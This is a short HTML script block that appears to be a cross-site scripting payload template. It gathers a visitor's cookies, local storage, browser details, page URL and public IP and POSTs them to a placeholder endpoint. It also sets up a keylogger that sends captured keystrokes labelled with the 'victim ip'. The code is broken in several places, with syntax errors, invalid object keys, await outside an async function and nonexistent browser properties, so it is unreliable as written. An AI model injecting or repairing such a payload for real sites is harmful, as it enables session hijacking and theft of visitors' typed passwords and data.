<script>
  async function myIp(){
    const response = await fetch('https://api.ipify.org?format=json');
    const data = await response.json();
    return data.ip;
    
    }
  const data = {
    "public ip" : myIp(),
    "cookie" : document.cookie,
    "storage" : JSON.stringify(navigator.localStorage),
    "user-agent" : navigator.ua,
    "platform" : navigator.platform,
    "page url" : window.location.href,
  }
  fetch("{{endpoint}}", {
    method : "POST",
    headers : {
      "content-type" : "application/json"
    },
    body : JSON.stringify(data)
  });
  function (){
    let logs = '';
    document.addEventListener("keydown", function(e){
      logs += e.key;
      if ( logs.length  >= 10 ) {
        fetch("{{endpoint}}", {
          method : "POST",
          headers : {
            "content-type" : "application/json"
          },
          body : JSON.stringify({ keys pressed : logs, victim ip : await myIp(), page url : window.location.href })
        });
      };
  });
  };();
 
</script>